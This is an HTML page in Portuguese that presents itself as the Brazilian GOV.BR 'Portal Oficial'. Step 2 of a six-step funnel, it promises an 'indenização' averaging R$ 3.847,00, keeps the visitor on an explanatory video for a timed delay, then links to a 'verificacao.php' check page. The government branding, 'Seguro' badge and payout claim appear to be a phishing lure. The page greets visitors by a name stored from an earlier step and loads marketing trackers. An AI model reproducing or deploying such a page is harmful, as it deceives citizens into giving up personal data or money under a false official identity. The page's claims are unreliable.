<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8; X-Content-Type-Options=nosniff">
  <title>Consulta - Educacional - 4</title>

  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4" blocking="render"></script>
  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" async defer></script>

  <!-- fontes -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link
    href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
    rel="stylesheet">

  <style>
    @keyframes pulse-scale {
      0%, 100% {
        transform: scale(1);
      }

      50% {
        transform: scale(1.05);
      }
    }

    .animate-pulse-scale {
      animation: pulse-scale 1s ease-in-out infinite;
    }
  </style>
</head>

<body class="w-full overflow-x-hidden font-[Poppins]">

  <div class="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">

    <!-- Cabeçalho -->
    <header
      class="fixed top-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-sm shadow-sm border-b border-gray-200">
      <div class="px-4 py-2 flex justify-between items-center">
        <div class="flex items-center space-x-3">
          <img alt="Logo GOV.BR" class="h-6 w-auto" src="imagens/Gov-br-logo-svg.png">
          <div class="hidden sm:block h-5 w-px bg-gray-300"></div>
          <span class="hidden sm:inline text-xs font-medium text-gray-600">Portal Oficial</span>
        </div>
        <div class="flex items-center space-x-3">
          <div class="flex items-center space-x-1 text-xs text-gray-500">
            <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
              <path fill-rule="evenodd"
                d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                clip-rule="evenodd"></path>
            </svg>
            <span class="hidden sm:inline">Seguro</span>
          </div>
          <button
            class="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-full transition-colors text-sm">
            <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
              <path fill-rule="evenodd"
                d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z"
                clip-rule="evenodd"></path>
            </svg>
            <span class="font-medium" id="nameHeader"></span>
          </button>
        </div>
      </div>
    </header>

    <div class="h-8"></div>

    <main class="pt-10 pb-8 px-4">
      <div class="max-w-md mx-auto">

        <!-- Barra de progresso -->
        <div class="mb-6">
          <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
            <span class="font-medium">Educação</span>
            <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">2 de 6</span>
          </div>
          <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
            <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full"
              style="width: 33.3333%;"></div>
          </div>
          <p class="text-xs text-gray-500 text-center">Entenda seus direitos</p>
        </div>

        <!-- Card -->
        <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
          <div class="bg-gradient-to-r from-blue-600 to-blue-700 text-white p-4 text-center">
            <div class="flex items-center justify-center space-x-2 mb-2">
              <svg fill="currentColor" viewBox="0 0 20 20" class="w-5 h-5">
                <path
                  d="M2 6a2 2 0 012-2h6l2 2h6a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2V6z">
                </path>
              </svg>
              <span class="font-bold text-sm">ENTENDA SEUS DIREITOS</span>
            </div>
            <p class="text-xs opacity-90">Assista ao vídeo para entender melhor</p>
          </div>

          <div class="p-6">
            <div class="text-center mb-6">
              <h2 class="text-xl font-bold text-gray-900 mb-2">
                Indenização: Seu por Direito
              </h2>
              <p class="text-gray-600 text-sm">
                Assista ao vídeo explicativo de <strong>35 segundos</strong> para entender seus direitos.
              </p>
            </div>

            <!-- Vídeo -->
            <div class="relative w-full max-w-xl mx-auto mb-6">
              <video id="video3" class="w-full rounded-md">
                <source src="video3.mp4" type="video/mp4">
                Seu navegador não suporta vídeo.
              </video>

              <!-- Overlay com botão -->
              <div id="overlay3"
                class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-30">
                <button onclick="playVideo3()"
                  class="flex flex-col items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded shadow-lg transition-transform hover:scale-105 animate-pulse-scale">
                  <span class="text-sm">Clique para ouvir</span>
                  <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="none"
                    stroke="currentColor" stroke-width="2" stroke-linecap="round"
                    stroke-linejoin="round" class="lucide lucide-volume-x">
                    <path
                      d="M11 4.7a.7.7 0 0 0-1.2-.5L6.4 7.6A1.4 1.4 0 0 1 5.4 8H3a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h2.4a1.4 1.4 0 0 1 1 .4l3.4 3.4A.7.7 0 0 0 11 19.3z" />
                    <line x1="22" y1="9" x2="16" y2="15" />
                    <line x1="16" y1="9" x2="22" y2="15" />
                  </svg>
                </button>
              </div>
            </div>

            <!-- Valor -->
            <div class="bg-green-50 border border-green-200 rounded-xl p-4 mb-6">
              <div class="flex items-center space-x-3">
                <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center">
                  <svg fill="currentColor" viewBox="0 0 20 20" class="w-5 h-5 text-green-600">
                    <path
                      d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z">
                    </path>
                  </svg>
                </div>
                <div>
                  <h4 class="font-bold text-green-800 text-sm">Valor Médio Resgatado</h4>
                  <div class="text-xl font-bold text-green-600">R$ 3.847,00</div>
                  <p class="text-green-700 text-xs">Por pessoa em 2024</p>
                </div>
              </div>
            </div>

            <!-- Mensagem de assistir -->
            <div id="watchingVideo"
              class="bg-amber-50 border border-amber-200 rounded-xl p-4 text-center mb-4">
              <div class="flex items-center justify-center space-x-2 text-amber-700">
                <svg fill="none" viewBox="0 0 24 24" class="w-5 h-5 animate-spin">
                  <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"
                    class="opacity-25"></circle>
                  <path fill="currentColor"
                    d="M4 12a8 8 0 018-8V0C5.4 0 0 5.4 0 12h4zm2 5.3A8 8 0 014 12H0c0 3 1.1 5.8 3 7.9l3-2.6z"
                    class="opacity-75"></path>
                </svg>
                <span class="text-sm font-medium">Assista ao vídeo para continuar</span>
              </div>
            </div>

            <!-- Botão -->
            <a href="verificacao.php" id="button4"
              class="hidden w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-3 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2">
              <span>VERIFICAR MINHA SITUAÇÃO</span>
              <svg fill="currentColor" viewBox="0 0 20 20" class="w-5 h-5">
                <path fill-rule="evenodd"
                  d="M10.3 3.3a1 1 0 011.4 0l6 6a1 1 0 010 1.4l-6 6a1 1 0 01-1.4-1.4L14.6 11H3a1 1 0 110-2h11.6l-4.3-4.3a1 1 0 010-1.4z"
                  clip-rule="evenodd"></path>
              </svg>
            </a>
          </div>
        </div>
      </div>
    </main>
  </div>

  <script>
    // Nome no topo
    const nameValue = (localStorage.getItem("name") || "").trim();
    const formattedName = nameValue.split(" ")[0] || "";
    document.getElementById("nameHeader").textContent = formattedName;

    // Função para reproduzir o vídeo
    function playVideo3() {
      const video = document.getElementById('video3');
      const overlay = document.getElementById('overlay3');
      video.muted = false;
      video.volume = 1;
      video.play().catch(() => { });
      overlay.classList.add('hidden');
    }

    // Exibe o botão após 38 segundos
    setTimeout(() => {
      document.getElementById('button4')?.classList.remove('hidden');
      document.getElementById('watchingVideo')?.classList.add('hidden');
    }, 38000);
  </script>

  <script defer src="https://static.cloudflareinsights.com/beacon.min.js"
    data-cf-beacon='{"token":"839824964e1143f3811effcdab6e94ca"}'></script>

</body>
</html>
